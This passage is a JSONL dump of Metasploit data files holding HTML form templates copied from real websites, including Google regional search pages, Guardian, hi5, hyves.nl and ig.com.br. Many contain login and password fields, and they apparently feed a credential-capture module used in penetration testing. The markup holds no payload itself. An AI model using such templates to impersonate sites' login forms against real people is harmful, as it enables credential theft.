{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.com.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google Search\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:33.395528"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.com.ua.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"\u00cf\u00ee\u00f8\u00f3\u00ea Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:33.717253"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.com.vn.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"T\u00ecm v&#7899;i Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:34.030211"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.dk.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google-s\u00f8gning\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:34.670724"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.fi.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google-haku\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:35.364708"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.fr.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Recherche Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:35.674968"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.gr.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"\u00c1\u00ed\u00e1\u00e6\u00de\u00f4\u00e7\u00f3\u00e7 Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:35.978143"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.it.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Cerca con Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:36.619268"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.pl.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Szukaj w Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"lr\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"lr\" type=\"radio\" id=\"il\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:37.304204"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.pt.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Pesquisa do Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:37.637446"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.ro.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"C\u00e3utare Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:37.967835"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.ru.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" autocomplete=\"off\" size=\"55\" title=\"\u00cf\u00ee\u00e8\u00f1\u00ea \u00e2 Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"lr\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"lr\" type=\"radio\" id=\"il\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:38.284976"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.se.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google-s\u00f6kning\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:38.627273"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/guardian.co.uk.txt", "content": "<form action='http://www.guardian.co.uk/com/r2sitesearch/tr/1,,,00.html' id='search' method='get' onsubmit='SearchForm();'> <input name=\"web-search-field\" class=\"text search-field\" type=\"text\" id=\"web-search-field\" /><input name=\"go-guardian\" class=\"submit sitesearch-submit\" type=\"submit\" id=\"go-guardian\" value=\"\" /></form><form action='http://jobs.guardian.co.uk/searchjobs/' onsubmit='return doSearchAllSubmit( this );'> <input name=\"freetext\" class=\"text plain-search\" type=\"text\" id=\"freetext-searchalljobs\" value=\"\" onfocus=\"this.value='';\" /><input name=\"keyword\" type=\"hidden\" id=\"keyword-searchalljobs\" value=\"\" /><input name=\"go\" class=\"submit\" type=\"submit\" value=\"\" /><input name=\"gusrc\" type=\"hidden\" value=\"\" /><input name=\"link\" type=\"hidden\" value=\"\" /></form><form action='http://jobs.guardian.co.uk/searchjobs/' onsubmit='return doSearchAllAndCvUploadSubmit( this )'> <input name=\"freetext\" class=\"text plain-search\" type=\"text\" id=\"freetext-searchandcvupload\" value=\"\" onfocus=\"this.value='';\" /><input name=\"go\" class=\"submit\" type=\"submit\" value=\"\" /><input name=\"keyword\" type=\"hidden\" id=\"keyword-searchandcvupload\" value=\"\" /><input name=\"gusrc\" type=\"hidden\" value=\"\" /><input name=\"link\" type=\"hidden\" value=\"\" /></form><form action='http://www.guardian.co.uk/redirect/1,,,00.html' id='section-selector' method='post' target='_TOP'> <input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:39.388363"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/gyao.jp.txt", "content": "<form name='frmLivedoor' action='http://gyaostream.search.livedoor.com/search/' method='get'> <input name=\"q\" class=\"live\" type=\"text\" value=\"\" /></form><form name='mylog' action='https://www.gyao.jp/js/mygyao_login.php' method='POST'> <input name=\"command\" type=\"hidden\" value=\"\" /><input name=\"user\" class=\"txt_log\" type=\"text\" value=\"\" /><input name=\"pass\" class=\"txt_log\" type=\"password\" value=\"\" /><input name=\"auto\" class=\"check\" type=\"checkbox\" /><input name=\"submit\" class=\"btn_mygyao\" type=\"image\" src=\"/common/img/bt_login_w.gif\" alt=\"\u0192\u008d\u0192O\u0192C\u0192\u201c\" onclick=\"document.mylog.uri.value=window.location.href;document.all.mylog.submit();\" /><input name=\"uri\" type=\"hidden\" value=\"\" /></form><form action='http://hikari.gyao.ne.jp/mod/main/act/searchmultiservice/' method='get' onsubmit='return searchMultiCheck(this.z1,this.z2,this.tel1,this.tel2,this.tel3,this.buildType)' target='_blank' style='margin:0;padding:0;'> <input name=\"agentid\" type=\"hidden\" value=\"\" /><input name=\"random_k\" type=\"hidden\" value=\"\" /><input name=\"tel1\" type=\"hidden\" value=\"\" /><input name=\"tel2\" type=\"hidden\" value=\"\" /><input name=\"tel3\" type=\"hidden\" value=\"\" /><input name=\"z1\" size=\"3\" type=\"text\" maxlength=\"3\" style=\"font-size:10px;width:30px;\" /><input name=\"z2\" size=\"4\" type=\"text\" maxlength=\"4\" style=\"font-size:10px;width:40px;\" /><input name=\"buildType\" checked=\"checked\" type=\"radio\" id=\"buildType2\" value=\"\" /><input name=\"buildType\" type=\"radio\" id=\"buildType1\" value=\"\" /><input name=\"btn\" title=\"\u0152\u0178\u008d\u00f5\" type=\"image\" src=\"/common/img/btn_search.gif\" onmouseover=\"this.org_src=this.src;this.src='/common/img/btn_search_on.gif';\" onmouseout=\"this.src=this.org_src;\" alt=\"\u0152\u0178\u008d\u00f5\" style=\"width:220px;height:26px;\" /></form>", "timestamp": "2025-10-24T23:40:39.697034"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/hao123.com.txt", "content": "<form name='gomail' action='' onsubmit='return clickMail()' method='post' id='FrLgn'> <input name=\"url\" type=\"hidden\" /><input name=\"username\" type=\"hidden\" /><input name=\"type\" type=\"hidden\" /><input name=\"password\" type=\"hidden\" /><input name=\"domain\" type=\"hidden\" /><input name=\".done\" type=\"hidden\" value=\"\" /><input name=\"user\" type=\"hidden\" /><input name=\"pass\" type=\"hidden\" /><input name=\"enterVip\" type=\"hidden\" value=\"\" /><input name=\"UserName\" type=\"hidden\" /><input name=\"Password\" type=\"hidden\" /><input name=\"u\" type=\"hidden\" /><input name=\"psw\" type=\"hidden\" /><input name=\"login\" type=\"hidden\" /><input name=\"LoginName\" type=\"hidden\" /><input name=\"usr\" type=\"hidden\" /><input name=\"func\" type=\"hidden\" /><input name=\"login_name\" type=\"hidden\" /><input name=\"login_password\" type=\"hidden\" /><input name=\"BackURL\" type=\"hidden\" /><input name=\"continue\" type=\"hidden\" value=\"\" /><input name=\"Email\" type=\"hidden\" /><input name=\"Passwd\" type=\"hidden\" /><input name=\"domainname\" type=\"hidden\" /><input name=\"firstlogin\" type=\"hidden\" value=\"\" /><input name=\"starttime\" type=\"hidden\" /><input name=\"p2\" type=\"hidden\" /><input name=\"passwd\" type=\"hidden\" /><input name=\"id\" type=\"hidden\" /><input name=\"m\" type=\"hidden\" /><input name=\"mpass\" type=\"hidden\" /><input name=\"loginid\" type=\"hidden\" /><input name=\"appid\" type=\"hidden\" /><input name=\"ru\" type=\"hidden\" /><input name=\"eru\" type=\"hidden\" /><input name=\"fl\" type=\"hidden\" /><input name=\"ct\" type=\"hidden\" /><input name=\"vr\" type=\"hidden\" /><input name=\"sg\" type=\"hidden\" /><input name=\"vwriter\" type=\"hidden\" /><input name=\"vpassword\" type=\"hidden\" /><input tabindex=\"1\" name=\"uName\" size=\"15\" /><input tabindex=\"3\" name=\"uPw\" size=\"12\" type=\"password\" /><input tabindex=\"4\" name=\"sub\" type=\"submit\" value=\"\" style=\"height:1.67em;width:5.0em;font-size:13px\" /><input name=\"cmd\" type=\"hidden\" value=\"\" /></form><form name='f' action='http://www.baidu.com/s' onsubmit='return haoValidate();'> <input name=\"kw\" type=\"hidden\" /><input name=\"sc\" type=\"hidden\" /><input name=\"cl\" type=\"hidden\" value=\"\" /><input name=\"tn\" type=\"hidden\" value=\"\" /><input name=\"ct\" type=\"hidden\" /><input name=\"pn\" type=\"hidden\" /><input name=\"rn\" type=\"hidden\" /><input name=\"lm\" type=\"hidden\" /><input name=\"ie\" type=\"hidden\" /><input name=\"rs2\" type=\"hidden\" /><input name=\"myselectvalue\" type=\"hidden\" /><input name=\"f\" type=\"hidden\" /><input name=\"pv\" type=\"hidden\" /><input name=\"z\" type=\"hidden\" /><input name=\"from\" type=\"hidden\" /><input name=\"word\" size=\"38\" type=\"text\" onmouseover=\"this.focus()\" onfocus=\"this.select()\" maxlength=\"100\" style=\"font-size:15px;margin-top:4px;font-family:verdana,arial;height:1.67em; padding-top:1px; padding-left:1px\" /><input type=\"submit\" value=\"\" style=\"height:1.9em;width:6.4em;font-size:14px; margin-bottom:-1px; padding-top:2px\" /></form><form name='form1' onsubmit='return(search4())'> <input name=\"key\" size=\"33\" type=\"text\" onmouseover=\"this.focus()\" onfocus=\"this.select()\" style=\"margin-bottom:-5px; font-size:16px;height:1.6em;font-family:arial,sans-serif,\u00cb\u00ce\u00cc\u00e5;padding-top:2px; padding-left:1px\" /><input name=\"B2\" type=\"submit\" value=\"\" style=\"height:1.9em;width:6.4em;font-size:14px; margin-bottom:-5px; padding-top:2px\" /><input name=\"abc6\" checked type=\"checkbox\" value=\"\" /><input name=\"abc4\" type=\"checkbox\" value=\"\" /><input name=\"abc7\" type=\"checkbox\" value=\"\" /><input name=\"abc9\" type=\"checkbox\" value=\"\" /><input name=\"abc11\" type=\"checkbox\" value=\"\" /><input name=\"abc0\" type=\"checkbox\" value=\"\" /><input name=\"abc5\" type=\"checkbox\" value=\"\" /><input name=\"abc15\" type=\"checkbox\" value=\"\" /><input name=\"abc12\" type=\"checkbox\" value=\"\" /><input name=\"abc3\" type=\"checkbox\" value=\"\" /><input name=\"abc14\" type=\"checkbox\" value=\"\" /><input name=\"abc10\" type=\"checkbox\" value=\"\" /><input name=\"abc13\" type=\"checkbox\" value=\"\" /><input name=\"abc16\" type=\"checkbox\" value=\"\" /><input name=\"abc2\" type=\"checkbox\" value=\"\" /><input name=\"abc1\" type=\"checkbox\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:40.054095"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/hatena.ne.jp.txt", "content": "<form name='search' class='searchform' action='http://search.hatena.ne.jp/search'> <input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"word\" size=\"25\" type=\"text\" id=\"word-keyword\" value=\"\" /><input class=\"search_button\" type=\"submit\" value=\"\" /></form><form name='search' class='searchform' action='http://search.hatena.ne.jp/asinsearch'> <input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"word\" size=\"25\" type=\"text\" id=\"word-asin\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form name='search' class='searchform' action='http://search.hatena.ne.jp/questsearch'> <input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"word\" size=\"25\" type=\"text\" id=\"word-quest\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='http://q.hatena.ne.jp/q' method='post'> <input type=\"submit\" value=\"\" /></form><form name='search' class='searchform' action='http://search.hatena.ne.jp/rakutensearch'> <input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"word\" size=\"25\" type=\"text\" id=\"word-rakuten\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form name='search' class='searchform' action='http://search.hatena.ne.jp/videosearch'> <input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"word\" size=\"25\" type=\"text\" id=\"word-video\" value=\"\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:40.406344"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/hi5.com.txt", "content": "<form action='/friend/registration/simpleRegistrationStep1.do' method='post'> <input name=\"timestamp\" type=\"hidden\" value=\"\" /><input name=\"showText\" type=\"hidden\" id=\"showText\" value=\"\" /><input name=\"regId\" type=\"hidden\" value=\"\" /><input name=\"currStep\" type=\"hidden\" value=\"\" /><input name=\"validateStep\" type=\"hidden\" value=\"\" /><input name=\"user.permissions\" type=\"hidden\" value=\"\" /><input name=\"manualEmailImporter\" type=\"hidden\" value=\"\" /><input name=\"user.firstname\" tabindex=\"4\" size=\"15\" maxlength=\"25\" /><input name=\"user.lastname\" tabindex=\"5\" size=\"15\" maxlength=\"25\" /><input name=\"user.email\" tabindex=\"6\" size=\"30\" maxlength=\"50\" /><input name=\"password\" tabindex=\"7\" size=\"30\" type=\"password\" maxlength=\"20\" /><input name=\"user.gender\" tabindex=\"8\" checked=\"checked\" type=\"radio\" value=\"\" /><input name=\"user.gender\" type=\"radio\" value=\"\" /><input name=\"agreeTOS\" type=\"hidden\" value=\"\" /><input class=\"bigButton\" type=\"submit\" id=\"submitButton\" value=\"\" align=\"center\" /></form><form name='loginForm' action='/friend/login.do;jsessionid=aowcHJt8oTE8' method='post'> <input name=\"email\" tabindex=\"1\" size=\"24\" type=\"text\" id=\"email\" value=\"\" maxlength=\"255\" /><input name=\"password\" tabindex=\"2\" size=\"24\" type=\"password\" value=\"\" maxlength=\"255\" /><input name=\"remember\" checked=\"true\" type=\"checkbox\" /><input tabindex=\"3\" class=\"submit\" type=\"submit\" value=\"\" /></form><form name='loginForm' action='/friend/login.do;jsessionid=aowcHJt8oTE8' method='post'> <input name=\"email\" tabindex=\"1\" size=\"24\" type=\"text\" id=\"email\" value=\"\" maxlength=\"255\" /><input name=\"password\" tabindex=\"2\" size=\"24\" type=\"password\" value=\"\" maxlength=\"255\" /><input name=\"remember\" checked=\"true\" type=\"checkbox\" /><input tabindex=\"3\" class=\"bigButton\" type=\"submit\" value=\"\" /></form><form action='/friend/registration/simpleRegistrationStep1.do' method='post'> <input name=\"timestamp\" type=\"hidden\" value=\"\" /><input name=\"regId\" type=\"hidden\" value=\"\" /><input name=\"currStep\" type=\"hidden\" value=\"\" /><input name=\"validateStep\" type=\"hidden\" value=\"\" /><input name=\"user.permissions\" type=\"hidden\" value=\"\" /><input name=\"user.firstname\" tabindex=\"4\" size=\"15\" maxlength=\"25\" /><input name=\"user.lastname\" tabindex=\"5\" size=\"15\" maxlength=\"25\" /><input name=\"user.email\" tabindex=\"6\" size=\"30\" maxlength=\"50\" /><input name=\"password\" tabindex=\"7\" size=\"30\" type=\"password\" maxlength=\"20\" /><input class=\"bigButton\" type=\"submit\" id=\"submitButton\" value=\"\" align=\"center\" /></form>", "timestamp": "2025-10-24T23:40:40.727039"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/hornymatches.com.txt", "content": "<form name='login_form' action='/login.php' method='post' style='margin: 0; padding: 0;'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"username\" onkeypress=\"return ent(event,msg_time)\" type=\"text\" style=\"border: 1px solid black; width: 140px; height: 20px;\" /><input name=\"password\" onkeypress=\"return ent(event,msg_time)\" type=\"password\" style=\"border: 1px solid black; width: 140px; height: 20px;\" /></form><form name='search_form' action='/freelist.php' method='post' id='search_form'> <input name=\"f_min_age\" size=\"3\" class=\"field_sm\" type=\"text\" value=\"\" maxlength=\"2\" /><input name=\"f_max_age\" size=\"3\" class=\"field_sm\" type=\"text\" value=\"\" maxlength=\"2\" /><input name=\"Submit\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:41.054802"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/hp.com.txt", "content": "<form class='zeroMargin' action='http://www.hp.com/search/' method='get'> <input name=\"cc\" type=\"hidden\" value=\"\" /><input name=\"lang\" type=\"hidden\" value=\"\" /><input name=\"qt\" tabindex=\"1\" size=\"26\" title=\"Enter search criteria here to find content on HP.com\" type=\"text\" id=\"searchBox\" value=\"\" onfocus=\"globalToggle(); clearDefault(this); HideCountries(); toggleCountry(false);\" maxlength=\"100\" /><input name=\"search\" tabindex=\"1\" title=\"Begin your search\" class=\"submitCaret\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:41.370146"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/hurriyet.com.tr.txt", "content": "<form action='http://arama.hurriyet.com.tr/default.aspx' method='get' target='_blank'> <input name=\"keyword\" class=\"hurriyet2008_arama_form\" type=\"text\" value=\"\" onclick=\"javascript:this.value=''\" /><input name=\"Submit\" class=\"hurriyet2008_arama_btn\" type=\"submit\" value=\"\" style=\"cursor:hand\" /></form><form name='Form1' action='http://tvrehberi.hurriyet.com.tr/GuideChannel.aspx' method='get' target='_blank' style='margin:0px; padding:0px'> <input class=\"hurtextverdana_box_2\" type=\"submit\" value=\"\" style=\"color:Black;height:22px;width:98%;FONT-WEIGHT: bold; font-size:12px;\" /></form><form name='yenibiris_form' action='javascript:ara_yenibiris();' id='yenibiris_form'> <input name=\"Submit2\" class=\"arama_yenibir_form_btn\" type=\"submit\" value=\"\" /></form><form name='hurriyetemlak_form' action='javascript:ara_hurriyetemlak();' id='hurriyetemlak_form'> <input name=\"s1\" class=\"radio\" type=\"radio\" value=\"\" /><input name=\"s1\" class=\"radio\" type=\"radio\" value=\"\" /><input name=\"Submit\" class=\"arama_emlak_form_btn\" type=\"submit\" value=\"\" /></form><form name='hurriyetoto_form' action='javascript:ara_hurriyetoto();' id='hurriyetoto_form'> <input name=\"Submit3\" class=\"arama_oto_form_btn\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:41.712641"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/hyves.nl.txt", "content": "<form name='loginform' class='loginform' action='/?module=authentication&action=basicLogin' id='loginform' method='post' style='display: inline;'> <input name=\"PHPSESSID\" type=\"hidden\" value=\"\" /><input name=\"login_username\" tabindex=\"\" class=\"BodyTextSmall\" type=\"text\" style=\"width:100px;\" /><input name=\"login_password\" tabindex=\"\" class=\"BodyTextSmall\" type=\"password\" style=\"width:70px;\" /><input name=\"btnLogin\" tabindex=\"\" class=\"Submit\" type=\"submit\" value=\"\" style=\"width: 35px;\" /><input name=\"login_autologin\" tabindex=\"\" type=\"checkbox\" value=\"\" /><input name=\"auth_currentUrl\" type=\"hidden\" value=\"\" /></form><form action='http://www.hyves.nl/?' id='form_search_statusline' method='post'> <input name=\"PHPSESSID\" type=\"hidden\" value=\"\" /><input name=\"postman\" type=\"hidden\" value=\"\" /><input name=\"postman_secret\" type=\"hidden\" value=\"\" /><input name=\"sitepositionurl\" type=\"hidden\" value=\"\" /><input name=\"cityfailureurl\" type=\"hidden\" value=\"\" /><input name=\"searchterms\" size=\"20\" class=\"NavBarHomepageSearch\" type=\"text\" id=\"menu_searchterms\" style=\"border: 1px solid #CCC;\" /><input name=\"search_ok\" class=\"Submit\" type=\"submit\" id=\"search_ok\" value=\"\" style=\"width: 30px;\" /></form><form name='localchangeform' action='/index.php' method='get'> <input name=\"PHPSESSID\" type=\"hidden\" value=\"\" /><input name=\"local\" type=\"hidden\" /></form>", "timestamp": "2025-10-24T23:40:42.055675"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ibm.com.txt", "content": "<form action='http://www.ibm.com/Search/' method='get' id='ibm-search-form'> <input name=\"q\" type=\"text\" id=\"q\" maxlength=\"100\" /><input name=\"v\" type=\"hidden\" value=\"\" /><input name=\"en\" type=\"hidden\" value=\"\" /><input name=\"lang\" type=\"hidden\" value=\"\" /><input name=\"cc\" type=\"hidden\" value=\"\" /><input name=\"Search\" class=\"ibm-btn-search\" type=\"submit\" id=\"ibm-search\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:42.380517"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ifeng.com.txt", "content": "<form id='fm0' method='post' target='_blank'> <input name=\"m\" type=\"radio\" id=\"ra1\" value=\"\" /><input name=\"m\" type=\"radio\" id=\"ra0\" value=\"\" /><input name=\"q\" class=\"input_1\" type=\"text\" input /></form>", "timestamp": "2025-10-24T23:40:42.704612"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ifolder.ru.txt", "content": "<form action='download' method='post' style='margin-left: 23;'> <input name=\"file_id\" class=\"text\" type=\"text\" accesskey=\"D\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form name='theuploadform' enctype='multipart/form-data' action='http://upl.stg225.ifolder.ru/?serial=6eec625a6d747dcf97b14370226ab297' method='post' onsubmit='startprogress()' style='margin-left: 23;'> <input name=\"filename\" tabindex=\"1\" class=\"file1\" type=\"file\" accesskey=\"U\" id=\"uploadfilefield\" value=\"\" /><input tabindex=\"3\" class=\"button\" type=\"submit\" id=\"uploadbutton\" value=\"\" /><input name=\"upload_params\" type=\"hidden\" id=\"upload_params\" value=\"\" /><input name=\"clone\" type=\"hidden\" id=\"clone\" value=\"\" /><input name=\"progress_bar\" type=\"hidden\" id=\"progress_bar\" value=\"\" /><input name=\"upload_host\" type=\"hidden\" id=\"upload_host\" value=\"\" /><input name=\"MAX_FILE_SIZE\" type=\"hidden\" value=\"\" /><input name=\"show_progress_bar\" type=\"checkbox\" id=\"show_progress_bar\" value=\"\" style=\"display: none;\" /></form><form name='form1' action='/auth/login/' method='post'> <input name=\"cmd\" type=\"hidden\" value=\"\" /><input name=\"return_path\" type=\"hidden\" value=\"\" /><input name=\"return_params\" type=\"hidden\" value=\"\" /><input name=\"email\" tabindex=\"31\" class=\"text\" type=\"text\" value=\"\" /><input name=\"password\" tabindex=\"31\" class=\"text\" type=\"password\" value=\"\" /><input tabindex=\"32\" class=\"button\" type=\"submit\" value=\"\" style=\"width:70px;\" /><input name=\"stateless_authorization\" type=\"checkbox\" value=\"\" style=\"display: none;\" /></form>", "timestamp": "2025-10-24T23:40:43.033603"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ig.com.br.txt", "content": "<form enctype='application/x-www-form-urlencoded' action='#' id='formMail' method='post' lang='atmors'> <input name=\"username\" title=\"USU\u00c1RIO\" class=\"email\" type=\"text\" id=\"email\" value=\"\" alt=\"USU\u00c1RIO\" /><input name=\"password\" title=\"SENHA\" class=\"password\" type=\"password\" id=\"password\" value=\"\" alt=\"SENHA\" /><input title=\"OK\" class=\"button_ok\" type=\"submit\" value=\"\" alt=\"ok\" /></form><form enctype='application/x-www-form-urlencoded' action='http://busca.igbusca.com.br/app/search' id='formSearch' method='post' lang='atmors'> <input name=\"o\" type=\"hidden\" value=\"\" /><input name=\"q\" title=\"BUSCA\" class=\"search\" type=\"text\" id=\"search\" alt=\"BUSCA\" /><input name=\"submit\" class=\"button_search\" type=\"submit\" value=\"\" alt=\"BUSCAR\" /></form><form 